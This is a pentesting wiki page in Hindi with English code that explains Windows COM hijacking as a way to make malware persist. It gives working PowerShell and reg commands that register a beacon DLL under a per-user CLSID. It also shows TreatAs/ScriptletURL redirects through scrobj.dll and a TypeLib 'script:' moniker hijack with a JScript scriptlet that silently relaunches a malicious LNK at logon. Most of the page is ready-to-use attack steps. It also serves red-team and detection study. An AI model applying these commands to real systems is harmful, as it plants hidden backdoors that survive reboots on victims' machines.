# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### अस्तित्व में न होने वाले COM components को खोजना

क्योंकि HKCU की values users द्वारा modify की जा सकती हैं, **COM Hijacking** का उपयोग **persistence mechanism** के रूप में किया जा सकता है। `procmon` का उपयोग करके ऐसे searched COM registries को खोजना आसान है, जो अभी मौजूद नहीं हैं और जिन्हें attacker create कर सकता है। Classic filters:

- **RegOpenKey** operations।
- जहाँ _Result_ **NAME NOT FOUND** हो।
- और _Path_ का अंत **InprocServer32** से होता हो।

Hunting के दौरान उपयोगी variations:

- Missing **`LocalServer32`** keys भी खोजें। कुछ COM classes out-of-process servers होती हैं और DLL के बजाय attacker-controlled EXE launch करेंगी।
- `InprocServer32` के अलावा **`TreatAs`** और **`ScriptletURL`** registry operations भी खोजें। Recent detection content और malware writeups इनका उल्लेख लगातार करते हैं, क्योंकि ये सामान्य COM registrations की तुलना में बहुत दुर्लभ और इसलिए high-signal होते हैं।
- HKCU में registration clone करते समय original `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` से legitimate **`ThreadingModel`** copy करें। गलत model अक्सर activation को तोड़ देता है और hijack को noisy बना देता है।<sup>[[3]](#references)</sup>
- 64-bit systems पर 64-bit और 32-bit दोनों views (`procmon.exe` बनाम `procmon64.exe`, `HKLM\Software\Classes` और `HKLM\Software\Classes\WOW6432Node`) inspect करें, क्योंकि 32-bit applications किसी अलग COM registration को resolve कर सकती हैं।

जब आप यह तय कर लें कि किस non-existent COM का impersonate करना है, तो निम्न commands execute करें। _यदि आप ऐसे COM का impersonate करने का निर्णय लेते हैं जो हर कुछ seconds में load होता है, तो सावधान रहें, क्योंकि यह overkill हो सकता है।_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks Custom Triggers का उपयोग करके COM objects को call करते हैं और क्योंकि वे Task Scheduler के माध्यम से execute होते हैं, इसलिए यह अनुमान लगाना आसान होता है कि वे कब trigger होंगे।

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Output की जाँच करके आप ऐसा Task चुन सकते हैं जो, उदाहरण के लिए, **हर बार user के log in करने पर** execute होने वाला हो।

अब **HKEY\CLASSES\ROOT\CLSID** तथा HKLM और HKCU में **{1936ED8A-BD93-3213-E325-F38D112938EF}** CLSID को search करने पर, आमतौर पर आपको पता चलेगा कि यह value HKCU में मौजूद नहीं है।
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
फिर, आप केवल HKCU entry बना सकते हैं और हर बार user के log in करने पर आपका backdoor execute हो जाएगा।

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` एक CLSID को दूसरे CLSID द्वारा emulate करने की अनुमति देता है।<sup>[[4]](#references)</sup> Offensive perspective से इसका अर्थ है कि आप original CLSID को untouched छोड़ सकते हैं, एक दूसरा per-user CLSID बना सकते हैं जो `scrobj.dll` की ओर point करता हो, और फिर `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` के माध्यम से real COM object को malicious object पर redirect कर सकते हैं।

यह तब उपयोगी है जब:

- target application logon या app start के समय पहले से एक stable CLSID instantiate करती हो
- आप original `InprocServer32` को replace करने के बजाय केवल registry-based redirect चाहते हों
- आप `ScriptletURL` value के माध्यम से local या remote `.sct` scriptlet execute करना चाहते हों

Example workflow (public Atomic Red Team tradecraft और पुराने COM registry abuse research से adapted):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` `ScriptletURL` value को पढ़ता है और संदर्भित `.sct` को execute करता है, इसलिए payload को local file के रूप में रखा जा सकता है या HTTP/HTTPS के माध्यम से remote रूप से pull किया जा सकता है।
- `TreatAs` तब विशेष रूप से उपयोगी होता है जब original COM registration HKLM में complete और stable हो, क्योंकि पूरी tree को mirror करने के बजाय केवल एक छोटा per-user redirect चाहिए।
- Natural trigger की प्रतीक्षा किए बिना validation के लिए, यदि target class STA activation को support करता है, तो fake ProgID/CLSID को `rundll32.exe -sta <ProgID-or-CLSID>` के साथ manually instantiate किया जा सकता है।

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) COM interfaces को define करती हैं और `LoadTypeLib()` के माध्यम से load की जाती हैं। जब कोई COM server instantiate किया जाता है, तो OS `HKCR\TypeLib\{LIBID}` के अंतर्गत registry keys से संबंधित TypeLib को consult करके उसे भी load कर सकता है। यदि TypeLib path को किसी **moniker**, जैसे `script:C:\...\evil.sct`, से replace कर दिया जाए, तो TypeLib resolve होने पर Windows scriptlet को execute करेगा — जिससे एक stealthy persistence प्राप्त होती है, जो common components के access किए जाने पर trigger होती है।

यह Microsoft Web Browser control के विरुद्ध observe किया गया है (जिसे Internet Explorer, WebBrowser embed करने वाले apps और यहां तक कि `explorer.exe` भी अक्सर load करते हैं)।<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) किसी high-frequency CLSID द्वारा उपयोग किए जाने वाले TypeLib (LIBID) की पहचान करें। Malware chains द्वारा अक्सर abused किया जाने वाला example CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)।
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) `script:` moniker का उपयोग करके per-user TypeLib path को local scriptlet पर point करें (admin rights की आवश्यकता नहीं है):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) एक minimal JScript `.sct` फ़ाइल रखें, जो आपके primary payload (जैसे initial chain द्वारा उपयोग की जाने वाली `.lnk`) को फिर से launch करे:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – IE, WebBrowser control को embed करने वाले application, या सामान्य Explorer activity को खोलने पर TypeLib load होगी और scriptlet execute होगा, जिससे logon/reboot पर आपकी chain फिर से सक्रिय हो जाएगी।

Cleanup
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notes
- आप यही logic अन्य high-frequency COM components पर भी लागू कर सकते हैं; हमेशा पहले `HKCR\CLSID\{CLSID}\TypeLib` से वास्तविक `LIBID` resolve करें।
- 64-bit systems पर आप 64-bit consumers के लिए `win64` subkey भी populate कर सकते हैं।

## References

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
